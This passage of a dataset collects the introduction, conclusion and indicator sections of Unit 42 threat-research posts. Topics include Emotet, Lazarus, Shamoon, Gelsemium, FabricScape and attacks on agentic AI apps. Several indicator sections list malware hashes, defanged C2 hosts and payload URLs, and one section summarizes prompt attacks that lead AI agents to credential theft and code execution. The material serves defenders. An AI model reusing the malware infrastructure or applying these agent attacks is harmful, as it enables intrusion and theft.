Denial of Service (DoS) of the container enginesCRI-OandPodmanwhen pulling a malicious image from a registry. Through this vulnerability, malicious actors could jeopardize any containerized infrastructure that relies on these vulnerable container engines, including Kubernetes and OpenShift.\nPalo Alto Networks customers runningPrisma Cloudare protected from this vulnerability through the Prisma Cloud Compute host vulnerability scanner and theTrusted Imagesfeature.", "source": "Palo"}, {"title": "Conclusion", "content": "In the last several years, multiple security audits were conducted by Unit 42 and others on cloud applications and container infrastructure. Thanks to these audits, many security issues are being identified and addressed. As the transition to the cloud is rapidly increasing, adversaries will continue to shift their focus to the cloud. We are committed to supporting cloud infrastructure by conducting security audits, finding critical vulnerabilities and encouraging organizations to address them by issuing patches and applying them.\nPalo Alto Networks customers runningPrisma Cloudare protected from this vulnerability through the Prisma Cloud Compute host vulnerability scanner and theTrusted Imagesfeature.", "source": "Palo"}, {"title": "Introduction", "content": "This post presents our research on a methodology we call BOLABuster, which uses large language models (LLMs) to detect broken object level authorization (BOLA) vulnerabilities. By automating BOLA detection at scale, we will show promising results in identifying these vulnerabilities in open-source projects.\nBOLA is a widespread and potentially critical vulnerability in modern APIs and web applications. While manually exploiting BOLA vulnerabilities is usually straightforward, automatically identifying new BOLAs is challenging for the following reasons:\nThe complexities of application logic \nThe diverse range of input parameters \nThe stateful nature of modern web applications\nFor these reasons, traditional methodologies like fuzzing and static analysis are ineffective in detecting BOLAs, making manual detection the standard approach.\nTo address these challenges, we utilize the reasoning and generative capabilities of LLMs to automate tasks traditionally done manually. These tasks include the following:\nUnderstanding application logic \nIdentifying endpoint dependency relationships \nGenerating test cases and interpreting test results\nBy combining LLMs with heuristics, our method enables fully automated BOLA detection at scale.\nAlthough our research is in its early stages, we have successfully uncovered quite a few BOLA vulnerabilities in both internal and open-source projects. These include the following vulnerabilities:\nGrafana(CVE-2024-1313) \nHarbor(CVE-2024-22278) \nEasy!Appointments(CVE-2023-3285toCVE-2023-3290andCVE-2023-38047toCVE-2023-38055)\nAs we continue to refine our research, we are also proactively hunting for BOLAs in the wild.\nCortex Xpanse and Cortex XSIAM customers with the ASM module are able to detect all exposed Grafana, Harbor and Easy!Appointments instances as well as known insecure instances via targeted attack surface rules.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Our research demonstrates the significant potential of AI in revolutionizing vulnerability detection and security research. By leveraging LLMs to automate tasks that were previously manual and time-intensive, we've shown that AI can serve as a reliable assistant. This is true not only for writing code but also for debugging and identifying vulnerabilities.\nAlthough our research is still in its early stages, the implications are profound. The methodology we've developed for BOLA detection can potentially be extended to identify other types of vulnerabilities, opening new avenues for vulnerability research. As AI technology continues to advance, we anticipate that similar approaches will enable a range of security research initiatives that were previously impractical or impossible.\nIt is also worth noting that this technology can be a double-edged sword. While defenders can use AI to enhance their security measures, adversaries can exploit the same technology to discover zero-day vulnerabilities more quickly and escalate cyberattacks.\nThe concept of fighting AI with AI has never been more relevant, as we strive to outsmart adversaries with more intelligent and precise AI-driven solutions. It is imperative for the cybersecurity community to remain vigilant and proactive in developing strategies to counteract potential threats posed by AI.\nAs we use this methodology to identify BOLA vulnerabilities in different products, we responsibly disclose any we find to the appropriate vendors. We also ensure product coverage for vulnerabilities identified, such as those with Grafana, Harbor and Easy!Appointments.\nCortex XpanseandCortex XSIAMcustomers with the ASM module are able to detect all exposed, Grafana, Harbor and Easy!Appointments instances as well as known insecure instances via targeted attack surface rules.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "In August 2012, an attack campaign known as Shamoon targeted a Saudi Arabian energy company to deliver a malware called Disttrack. Disttrack is a multipurpose tool that exhibits worm-like behavior by attempting to spread to other systems on a local network using stolen administrator credentials. More importantly, its claim to fame is the ability to destroy data and to render infected systems unusable. The attack four years ago resulted in 30,000 or more systems being damaged.\nLast week, Unit 42 came across new Disttrack samples that appear to have been used in an updated attack campaign. The attack targeted at leastone organization in Saudi Arabia, which aligns with the targeting of the initial Shamoon attacks. It appears the purpose of the new Disttrack samples were solely focused on destruction, as the samples were configured with a non-operational C2 server to report to and were set to begin wiping data exactly on 2016/11/17 20:45. In another similarity to Shamoon, this is the end of the work week in Saudi Arabia (their work week is from Sunday to Thursdays), so the malware had potentially the entire weekend to spread.  The 2012 Shamoon attacks took place on Lailat al Qadr, the holiest night of the year for Muslims; another time the attackers could be reasonably certain employees would not be at work.", "source": "Palo"}, {"title": "Conclusion", "content": "After a four year hiatus, threat actors likely associated with the Shamoon attack campaign have used their Disttrack malware to target at least one organization inSaudi Arabia. The current attack campaign has several TTP overlaps with the original Shamoon campaign, especially from a targeting and timing perspective. Also, Disttrack malware used in the recent attacks is very similar to the variant used in the 2012 attacks, which uses the exact same RawDisk device driver as well (down to the same, temporary license key).. The main purpose of the Disttrack malware is to overwrite files and storage partitions in an attempt to destroy data and render the system unusable. To maximize its destruction, the Disttrack tool attempts to spread to other systems on the network using stolen administrator credentials, which suggests that the threat actors had previous access to the network or carried out successful phishing attacks prior to the attack using Disttrack.\nPalo Alto Networks customers are protected from Disttrack:\nAll known samples have a malicious verdict in WildFire \nAutoFocus customers can monitor Disttrack activity via theDisttrack tag", "source": "Palo"}, {"title": "Indicators", "content": "Disttrack Droppers\n47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34 (x64)394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b(x86)\nCommunication Components\n772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5 (x64)61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842 (x86)\nWiper Components\nc7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a (x64)\n128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd (x86)\nEldoS RawDisk Samples\n5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a (x64)4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6 (x86)", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers observed many large-scale phishing campaigns in 2024 that used a refresh entry in the HTTP response header. From May-July we detected around 2,000 malicious URLs daily that were associated with campaigns of this type.\nUnlike other phishing webpage distribution behavior through HTML content, these attacks use the response header sent by a server, which occurs before the processing of the HTML content. Malicious links direct the browser to automatically refresh or reload a webpage immediately, without requiring user interaction.\nAttackers predominantly distribute the malicious URLs in the phishing campaigns via emails. These emails consistently include recipients' email addresses and display spoofed webmail login pages based on the recipients' email domain pre-filled with the users' information. They largely target people in the global financial sector, well-known internet portals and government domains.\nSince the original and landing URLs are often found under legitimate or compromised domains, it is difficult to spot malicious indicators within a URL string. Furthermore, attackers use personalized approaches that increase the likelihood that they will deceive their victim.\nPalo Alto Networks customers are better protected from the threats discussed above throughAdvanced URL Filtering (AURL). Besides identifying phishing URLs in the described scenario, AURL extracts patterns from these suspicious URLs and could discover additional phishing websites.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "In the additional resources section below, we've listed some examples of phishing webpage distribution behavior through HTML content, specifically through the injection of a malicious URL to themeta fieldof the HTML file. However, as of August 2024, no literature specifically addresses attacks using a refresh entry in the response header sent by a server that occurs before the server processes the HTML content of the response body.\nThis article documents the frequent use of HTTP refresh fields in HTTP response headers in phishing attacks.\nIn our research, we found no legitimate websites exhibiting this behavior. Although the refresh header can be useful in specific situations like dynamically updating websites, we more commonly see other methods such as JavaScript-based techniques or server-side push technologies like WebSockets.\nUltimately, organizations should be more aware of the potential for malicious use of HTTP refresh headers.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers discovered a security risk in the Google Workspace (formerly known as G Suite) domain-wide delegation feature. We exposed an unexpected way to gain access to the Google Workspace domain data from Google Cloud Platform (GCP).\nWe found that a GCP identity with the necessary permission can generate an access token to a delegated user. A malicious insider or an external attacker with stolen credentials can use this access token to impersonate Google Workspace users, granting unauthorized access to their data or to perform operations on their behalf.\nIn this article, we will highlight the risk of the Google Workspace domain-wide delegation feature. In doing so, we will explore its potential misuse by malicious actors and examine the implications for the security of Google Workspace data.\nAs organizations increasingly rely on the power of cloud-based services like Google Workspace and Google Cloud Platform GCP, it becomes crucial to delve into the intricacies of their security features and vulnerabilities. We will discuss the link between GCP and Google Workspace and examine how the GCP permission model can impact the security of Google Workspace.\nPalo Alto Networks customers receive protection from the issue discussed in this article through Cortex XDR and Prisma Cloud.", "source": "Palo"}, {"title": "Conclusion", "content": "We've been discussing this issue with Google through a variety of contact points since June 2023. This issue was alsoidentified by Team Axon, which they have also reported to Google.\nThere are risks and implications associated with the domain-wide delegation feature that security defenders need to consider when configuring this permission. Depending on thescope that was granted with the domain-wide delegation, an attacker can use the feature to impersonate Google Workspace users, perform actions on their behalf and gain unauthorized access to their data.\nIt's important to highlight the mismatch between the initial permissions required for the attacker to misuse this feature, and the possible impact. In worst cases, an attacker or a malicious insider can leak sensitive Google Workspace data, such as emails, documents, and other confidential information stored within the domain.\nPalo Alto Networks customers receive protection from the issue discussed in this article through both Cortex XDR and Prisma Cloud.\nCortex XDRcapabilities can identify and alert on various abnormal activities such as the granting of domain wide delegation permissions or the creation of GCP service account keys. Cortex XDR is able to learn the behavior of GCP and Google Workspace entities and detect unusual behavior.\nPrisma Cloud CIEMcan help mitigate risky and over-privileged access by providing:\nVisibility, alerting, and automated remediation on risky permissions \nAutomatic findings of unused permissions with Least-privilege access remediations\nPrisma Cloud Threat Detection capabilities can alert on various identity-related anomalous activities such as unusual usage of credentials from inside or outside of the cloud.\nPrisma Cloud can also perform runtime operation monitoring and provide governance, risk and compliance (GRC) requirements for any component associated with their cloud environment.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Agentic applications are programs that leverage AI agents - software designed to autonomously collect data and take actions toward specific objectives - to drive their functionality. As AI agents are becoming more widely adopted in real-world applications, understanding their security implications is critical. This article investigates ways attackers can target agentic applications, presenting nine concrete attack scenarios that result in outcomes such as information leakage, credential theft, tool exploitation and remote code execution.\nTo assess how widely applicable these risks are, we implemented two functionally identical applications using different open-source agent frameworks -CrewAIandAutoGen- and executed the same attacks on both. Our findings show that most vulnerabilities and attack vectors are largely framework-agnostic, arising from insecure design patterns, misconfigurations and unsafe tool integrations, rather than flaws in the frameworks themselves.\nWe also propose defense strategies for each attack scenario, analyzing their effectiveness and limitations. To support reproducibility and further research, we've open-sourced the source code and datasets onGitHub.", "source": "Palo"}, {"title": "Conclusion", "content": "Agentic applications inherit the vulnerabilities of both LLMs and external tools while expanding the attack surface through complex workflows, autonomous decision-making and dynamic tool invocation. This amplifies the potential impact of compromises, which can escalate from information leakage and unauthorized access to remote code execution and full infrastructure takeover. As our simulated attacks demonstrate, a wide variety of prompt payloads can trigger the same weakness, underscoring how flexible and evasive these threats can be.\nSecuring AI agents requires more than ad hoc fixes. It demands a defense-in-depth strategy that spans prompt hardening, input validation, secure tool integration and robust runtime monitoring.\nGeneral-purpose security mechanisms alone are insufficient. Organizations must adopt purpose-built solutions - such as Palo Alto NetworksPrisma AIRS- toDiscover, Assess and Protectthreats unique to agentic applications.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nAUnit 42 AI Security Assessmentcan help you proactively identify the threats most likely to target your AI environment.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "A cluster of threat actor activity that Unit 42 observed attacking a Southeast Asian government target could provide insight into a rarely seen, stealthy APT group known as Gelsemium.\nWe found this activity as part of aninvestigation into compromised environmentswithin a Southeast Asian government. We identified the cluster as CL-STA-0046.\nThis unique cluster had activity spanning over six months between 2022-2023. It featured a combination of rare tools and techniques that the threat actor leveraged to gain a clandestine foothold and collect intelligence from sensitive IIS servers belonging to a government entity in Southeast Asia.\nIn addition to an array of web shells, the main backdoors used by the threat actor were OwlProxy and SessionManager. This combination, which waspublicly documented once before in 2020, is rare and was previously used to target several entities in Laos.\nBased on our analysis and available threat intelligence, we attribute CL-STA-0046 to the Gelsemium APT group, with a moderate level of confidence. The observations we describe here could provide a view into a threat group about which only a handful of public reports have been published to date.\nAccording to researchpublished by ESET, the Gelsemium APT group has been operational since at least 2014. It is recognized for its tendency to target a diverse range of entities, including governments, universities, electronics manufacturers and religious organizations, predominantly in East Asia and the Middle East.\nDespite Gelsemium's long-standing presence in the threat landscape, limited information has been available about their tactics, techniques, and procedures (TTPs). Our analysis and description of this cluster of activities provides deep technical insights into the tools and strategies that this APT group might employ.\nAdditionally, we provide a documented timeline of the operations we observed, presenting a repository of indicators for defenders.\nPalo Alto Networks customers receive protections against the threats discussed in this article through Advanced WildFire, Advanced URL Filtering, DNS Security, Cortex XDR and Cortex XSIAM, as detailed in theconclusion.\nOrganizations can engage theUnit 42 Incident Responseteam for specific assistance with this threat and others.", "source": "Palo"}, {"title": "Conclusion", "content": "CL-STA-0046 is one ofthree clustersthat we observed targeting the government sector in a country in Southeast Asia. Unit 42 associates the activity observed by the threat actor behind CL-STA-0046 to the Gelsemium APT group with a moderate level of confidence.\nAs part of the activity we observed, the threat actor received access through the use of several web shells, following the attempted installation of multiple types of proxy malware and an IIS backdoor. As some of the threat actor's attempts to install malware were unsuccessful, they kept delivering new tools, showing their ability to adapt to the mitigation process.\nThe findings of this investigation highlight the urgent need for enhanced security measures, vigilant monitoring and proactive threat intelligence sharing among government entities and affected industries in Southeast Asia. By adopting a multilayered defense approach and staying informed about emerging threats, organizations can better protect themselves against the persistent and evolving tactics employed by threat actors such as Gelsemium.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has identified malware with recent compilation and distribution timestamps that has code, infrastructure, and themes overlapping with threats described previously in theOperation Blockbusterreport, written by researchers at Novetta. This report details the activities from a group they named Lazarus, their tools, and the techniques they use to infiltrate computer networks. The Lazarus group is tied to the 2014 attack onSony Pictures Entertainmentand the2013 DarkSeoul attacks.\nThis recently identified activity is targeting Korean speaking individuals, while the threat actors behind the attack likely speak both Korean and English. This blog will detail the recently discovered samples, their functionality, and their ties to the threat group behind Operation Blockbuster.", "source": "Palo"}, {"title": "Indicators", "content": "Initial Malicious Documents\ncec26d8629c5f223a120677a5c7fbd8d477f9a1b963f19d3f1195a7f94bc194bff58189452668d8c2829a0e9ba8a98a34482c4f2c5c363dc0671700ba58b7bee\nInitial Payload\n1322b5642e19586383e663613188b0cead91f30a0ab1004bf06f10d8b15daf65032ccd6ae0a6e49ac93b7bd10c7d249f853fff3f5771a1fe3797f733f09db5a0 (unpacked)\nTesting Malicious Documents\n90e74b5d762fa00fff851d2f3fad8dc3266bfca81d307eeb749cce66a7dcf3e1\n09fc4219169ce7aac5e408c7f5c7bfde10df6e48868d7b470dc7ce41ee360723\nd1e4d51024b0e25cfac56b1268e1de2f98f86225bbad913345806ff089508080\n040d20357cbb9e950a3dd0b0e5c3260b96b7d3a9dfe15ad3331c98835caa8c63\ndfc420190ef535cbabf63436e905954d6d3a9ddb65e57665ae8e99fa3e767316\nf21290968b51b11516e7a86e301148e3b4af7bc2a8b3afe36bc5021086d1fab2\n1491896d42eb975400958b2c575522d2d73ffa3eb8bdd3eb5af1c666a66aeb08\n31e8a920822ee2a273eb91ec59f5e93ac024d3d7ee794fa6e0e68137734e0443\n49ecead98ebc750cf0e1c48fccf5c4b07fadef653be034cdcdcd7ba654f713af\n5c10b34e99b0f0681f79eaba39e3fe60e1a03ec43faf14b28850be80830722cb\n600ddacdf16559135f6e581d41b30d0867aae313fbaf66eb4d18345b2136cdd7\n6ccb8a10e253cddd8d4c4b85d19bbb288b56b8174a3f1f2fe1f9151732e1a7da\n8b2c44c4b4dc3d7cf1b71bd6fcc37898dcd9573fcf3cb8159add6cb9cfc9651b\n9e71d0fdb9874049f310a6ab118ba2559fc1c491ed93c3fd6f250c780e61b6ff\nAdditional Related Samples\n02d74124957b6de4b087a7d12efa01c43558bf6bdaccef9926a022bcffcdcfea\n0c5cdbf6f043780dc5fff4b7a977a1874457cc125b4d1da70808bfa720022477\n18579d1cc9810ca0b5230e8671a16f9e65b9c9cdd268db6c3535940c30b12f9e\n19b23f169606bd390581afe1b27c2c8659d736cbfa4c3e58ed83a287049522f6\n1efffd64f2215e2b574b9f8892bbb3ab6e0f98cf0684e479f1a67f0f521ec0fe\n440dd79e8e5906f0a73b80bf0dc58f186cb289b4edb9e5bc4922d4e197bce10c\n446ce29f6df3ac2692773e0a9b2a973d0013e059543c858554ac8200ba1d09cf\n557c63737bf6752eba32bd688eb046c174e53140950e0d91ea609e7f42c80062\n5c10b34e99b0f0681f79eaba39e3fe60e1a03ec43faf14b28850be80830722cb\n644c01322628adf8574d69afe25c4eb2cdc0bfa400e689645c2ab80becbacc33\n6a34f4ce012e52f5f94c1a163111df8b1c5b96c8dc0836ba600c2da84059c6ad\n77a32726af6205d27999b9a564dd7b020dc0a8f697a81a8f597b971140e28976\n79fe6576d0a26bd41f1f3a3a7bfeff6b5b7c867d624b004b21fadfdd49e6cb18\n8085dae410e54bc0e9f962edc92fa8245a8a65d27b0d06292739458ce59c6ba1\n8b21e36aa81ace60c797ac8299c8a80f366cb0f3c703465a2b9a6dbf3e65861e\n9c6a23e6662659b3dee96234e51f711dd493aaba93ce132111c56164ad02cf5e\nd843f31a1fb62ee49939940bf5a998472a9f92b23336affa7bccfa836fe299f5\ndcea917093643bc536191ff70013cb27a0519c07952fbf626b4cc5f3feee2212\ndd8c3824c8ffdbf1e16da8cee43da01d43f91ee3cc90a38f50a6cc8d6a778b57\nefa2a0bbb69e60337b783db326b62c820b81325d39fb4761c9b575668411e12c\nf365a042fbf57ed2fe3fd75b588c46ae358c14441905df1446e67d348bd902bf\nf618245e69695f6e985168f5e307fd6dc7e848832bf01c529818cbcfa4089e4a\nfa45603334dae86cc72e356df9aa5e21151bb09ffabf86b8dbf5bf42bd2bbadf\nfc19a42c423aefb5fdb19b50db52f84e1cbd20af6530e7c7b39435c4c7248cc7\nff4581d0c73bd526efdd6384bc1fb44b856120bc6bbf0098a1fa0de3efff900d\nC2 Domains\ndaedong.or[.]krkcnp.or[.]krkosic.or[.]krwstore[.]ltxkclub[.]hk\nC2 IPv4 Addresses\n103.224.82[.]154\n180.67.205[.]101\n182.70.113[.]138\n193.189.144[.]145\n199.26.11[.]17\n209.105.242[.]64\n211.233.13[.]11\n211.233.13[.]62\n211.236.42[.]52\n211.49.171[.]243\n218.103.37[.]22\n221.138.17[.]152\n221.161.82[.]208\n23.115.75[.]188\n61.100.180[.]9\n61.78.63[.]95\n80.153.49[.]82\nIgnite '17 Security Conference: Vancouver, BC June 12\u201315, 2017\nIgnite '17 Security Conference is a live, four-day conference designed for today's security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit theIgnite websitefor more information on tracks, workshops and marquee sessions.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers identified FabricScape (CVE-2022-30137), a vulnerability of important severity in Microsoft'sService Fabric\u2013 commonly used with Azure \u2013 that allows Linux containers to escalate their privileges in order to gain root privileges on the node, and then compromise all of the nodes in the cluster. The vulnerability could be exploited on containers that are configured to haveruntime access, which is granted by default to every container.\nService Fabric hosts more than 1 million applications and runs millions of cores daily,according to Microsoft. It powers many Azure offerings, includingAzure Service Fabric,Azure SQL DatabaseandAzure CosmosDB, as well as other Microsoft products includingCortanaandMicrosoft Power BI.\nUsing a container under our control to simulate a compromised workload, we were able to exploit the vulnerability onAzure Service Fabric, which is an Azure offering that deploys private Service Fabric clusters in the cloud. A few other exploitation attempts on Azure's offerings that are powered by managed multi tenant Service Fabric clusters have failed as Microsoft disables runtime access on containers of those offerings.\nWe worked closely with Microsoft (MSRC) to remediate the issue, which was fully fixed on June 14, 2022. Microsoft released a patch to Azure Service Fabric that has already mitigated the issue in Linux clusters, and also updated internal production environments of offerings and products that are powered by Service Fabric.\nWe advise customers running Azure Service Fabric without automatic updates enabled to upgrade their Linux clusters to the most recent Service Fabric release. Customers whose Linux clusters are automatically updated do not need to take further action.\nBoth Microsoft and Palo Alto Networks recommend avoiding execution of untrusted applications in Service Fabric. SeeService Fabric documentationfor more information.\nWhile we're not aware of any attacks in the wild that have successfully exploited this vulnerability, we want to urge organizations to take immediate action to identify whether their environments are vulnerable and quickly implement patches if they are.", "source": "Palo"}, {"title": "Conclusion", "content": "As the trend of migrating to the cloud grows exponentially, the cloud ecosystem adapts and reinvents itself constantly to keep up with demand by developing new technologies.\nAs part of a Palo Alto Networks commitment to improving public cloud security, we actively invest in researching such technologies and report issues to the vendors in order to keep customers and users safe.", "source": "Palo"}, {"title": "Introduction", "content": "As early as Dec. 21, 2021, Unit 42 observed a new infection method for the highly prevalent malware family Emotet. Emotet is high-volume malware that often changes and modifies its attack patterns. This latest modification of the Emotet attack follows suit.\nThe new attack delivers an Excel file through email, and the document contains an obfuscated Excel 4.0 macro. When the macro is activated, it downloads and executes an HTML application that downloads two stages of PowerShell to retrieve and execute the final Emotet payload.\nPalo Alto Networks customers are protected from Emotet and similar malware families using similar obfuscation techniques withCortex XDRor theNext-Generation Firewallwith theWildFireandThreat Preventionsecurity subscriptions.", "source": "Palo"}, {"title": "Conclusion", "content": "Emotet is a highly-active malware family that frequently changes its infection techniques. These changes are likely an attempt to avoid detection. Emotet's new attack chain reveals multiple stages with different file types and obfuscated script before arriving at the final Emotet payload.\nPalo Alto Networks customers are protected from malware families using similar obfuscation techniques with Cortex XDR or the Next-Generation Firewall with WildFire and Threat Prevention security subscriptions.", "source": "Palo"}, {"title": "Indicators", "content": "Appendix A: Files From Emotet Email Lure on Jan. 27, 2022\nSHA256 hash:9f22626232934970e4851467b7b746578f0f149984cd0e4e1a156b391727fac9File size: 40,929 bytesFile name:form.zipFile description: Password-protected encrypted zip archive seen on Jan. 27, 2022Password:EHGWQARLC\nSHA256 hash:6d55f25222831cce73fd9a64a8e5a63b002522dc2637bd2704f77168c7c02d88File size: 77,989 bytesFile name:form.xlsmFile description: Excel file with Excel 4.0 macros extracted from the above zip archive\nAppendix B: PowerShell Script Seen on Jan. 27, 2022\nSHA256 hash:9bda03babb0f2c6aa9861eca95b33af06a650e2851cce4edcc1fc3abd8e7c2a1File size: 10,986 bytesFile location:hxxp://91.240.118[.]168/se/s.htmlFile description: First-stage PowerShell script\nSHA256 hash:5bd4987db7e6946bf2ca3f73e17d6f75e2d8217df63b2f7763ea9a6ebcaf9fedFile size: 1,353 bytesFile location:hxxp://91.240.118[.]168/se/s.pngFile description: Second-stage PowerShell script\nAppendix C: URLs Hosting the Emotet DLL on Jan. 27, 2022\nhxxp://unifiedpharma[.]com/wp-content/5arxM/hxxp://hotelamerpalace[.]com/Fox-C404/LEPqPJpt4Gbr8BHAn/hxxps://connecticutsfinestmovers[.]com/Fox-C/mVwOqxT17gVWaE8E/hxxp://icfacn[.]com/runtime/n7qA2YStudp/hxxps://krezol-group[.]com:443/images/PmLGLKYeCBs5d/hxxp://ledcaopingdeng[.]com/wp-includes/Qq39yj7fpvk/hxxp://autodiscover.karlamejia[.]com/wp-admin/hcdnVlRIiwvTVrJjJEE/hxxps://crmweb[.]info:443/bitrix/rc9XjtwF/hxxp://accessunited-bank[.]com/admin/hzIgVwq8btak/hxxp://pigij[.]com/wp-admin/MVW5/hxxp://artanddesign[.]one/wp-content/uploads/A2cZL7/hxxp://strawberry.kids-singer[.]net/assets_c/WAdvNT84Dmu/hxxps://eleccom[.]shop:443/services/AEjSDj/hxxps://izocab[.]com/nashi-klienty/B5SC/\nAppendix D: Example of Emotet DLL on Jan. 27, 2022\nSHA256 hash:2de72908e0a1ef97e4e06d8b1ba3dc0d76f580cdf36f96b5c919bea770b2805fFile size: 516,096 bytesFile location:hxxp://unifiedpharma[.]com/wp-content/5arxM/File location:C:\\Users\\Public\\Documents\\ssd.dllFile location:C:\\Users\\[username]\\AppData\\Local\\[random characters]\\[random characters].[random characters]Run method:rundll32.exe [filename],[any string]\nUpdated Feb. 15, 2022, to list earlier dates of initial observation of the infection method.", "source": "Palo"}, {"title": "Introduction", "content": "Researchers at Palo Alto Networks discovered an automated scanning tool called Swiss Army Suite (S.A.S) during regular monitoring of telemetry data. Our research indicates that attackers used this tool to perform vulnerability scans not only on our customers' web services but also on various online websites.\nOur structured query language (SQL) injection detection model detected triggers containing unusual patterns that did not correlate to any known open-source or commercial automated vulnerability scanning tool. A tool generating this sort of traffic could have additional payloads that could potentially bypass web application firewalls (WAFs) or any other traffic filtering device that bases detection on known patterns of vulnerability scanning tools.\nAfter investigating the pattern across the internet, we discovered cached Google results showing attempted SQL injections with the same string patterns reported by several individuals in their online security device log files. However, at that time, we were still determining who the users of this specific tool were. The tool information is valuable from a defense standpoint, regardless of whether the detection strategy provided by the network security administrator is signature-based or machine learning-based.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourNetwork Securitysolutions, such asCloud-Delivered Security ServicesincludingAdvanced WildFireandAdvanced Threat Prevention. Prisma Cloudweb application and API security (WAAS)monitoring detects SQL injection attacks targeting cloud-based web applications and API applications.Cortexbehavioral rules monitor for specific malicious activity.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Non-commercial tools usually support uncommon features, such as the Dork Checker or Anti-Public. These features are not traditionally found in commercial tools but are present in the S.A.S. tool. These features would allow malicious users to develop a more complex attack strategy and launch more precise and effective vulnerability scans.\nFrom a defensive perspective, it is useful to differentiate between an automated scan and an actual attack. It is critical to know how to identify the capabilities of both closed-source commercial tools and restricted-access tools shared in underground forums. We tested different versions of S.A.S against a web application vulnerable to SQL injection.\nWe would like to extend our acknowledgements to Doel Santos, Nina Smith and Rashmi Reddy for their help on this research article.", "source": "Palo"}, {"title": "Introduction", "content": "This past week, our team has identified a group of malware samples that matched behavioral heuristics for multiple known malware families.  These samples all displayed their typical respective malware characteristics and contacted known command and control (C2) servers from those families. However, initial static analysis revealed that all of these samples appear to be identical on the surface, leading us to believe that we had discovered a new loader.  The malware families identified at this time are DarkComet, LuminosityLink RAT, Pony, ImmenentMonitor, and some multiple variations of shellcode.  We are calling the malicious loader StegBaus based on its use of custom steganography and a PDB string, which was found in an embedded DLL.\nBecause of the large number of infections that the aforementioned malware families have previously been involved in, any new loading techniques that could make it easier for an attacker to execute these malware families on a victim computer should be taken seriously and an attempt at identifying it pre-infection should be treated as a high-priority.\nThis loader is unique in numerous ways, most notably the steganography that is being used to hide the loader configuration, as well as the final payload.  These features will be discussed in the analysis section below.  The loader also uses common techniques, such as theRunPEmethod, to load final payload into memory as a new process.  This method has been seen in the wild for a number of years and typically involves utilizing a host process, threading contexts, and memory allocation.  Although these steps appear to be relatively static within the loader, there are slight differences we were able to identify based on the time of deployment.  One such case is a sample that appears to have been used for testing at least 6 months before the majority of samples were seen in the wild.\nUPDATE:The domains tags[.]bkrtx[.]com and sg[.]symcb[.]com were erroneously included in the list of domains below. On February 20, 2017, this blog post was updated to remove those domains from that list.", "source": "Palo"}, {"title": "Conclusion", "content": "The StegBaus loader that was identified contains many advanced data hiding techniques and has been seen delivering numerous different commodity malware families.\nCurrently, the loader itself is being identified as malware by WildFire and can be seen in Autofocus as well.  Palo Alto Networks is detecting this malicious loader via behavioral identifiers and is also identifying the malware families being delivered by these measures.\nI would like to thank threat analyst Brandon Levene for bringing this unique malware family to my attention.  The characteristics identified within the analyzed samples led to the discovery of more than 250 samples utilizing the StegBaus loader, all of which were identified as malware in WildFire.", "source": "Palo"}, {"title": "Introduction", "content": "Seasoned attackers will tell you that persistence is an important part of any successful hacking campaign. Persistence allows attackers to maintain continuous control of their captured servers. Whether they are hijacking resources, exfiltrating data or using their target machines as proxies, attackers always face the risk of having their treasured vulnerabilities patched and sealed, eliminating their way in. The shift from traditional computing to technologies like containers and serverless has made persistence harder to obtain, thanks to the transient nature and strong isolation mechanisms of these technologies.\nPalo Alto Networks customers are protected from these attacks by Prisma Cloud, which successfullydetects and mitigates vulnerabilitiesas well as using Prisma Cloud Compute'sextensive auditsandruntime defensefeatures to catch adversaries attempting to obtain persistence on their machines.", "source": "Palo"}, {"title": "Conclusion", "content": "Both containers and serverless functions limit malicious actors from achieving persistence, each with its own constraints. Successful attackers would either have to settle for temporary execution, or find ways to break out of the container or function sandbox to get real persistence. While the same constraints can be applied to traditional VMs as well, it 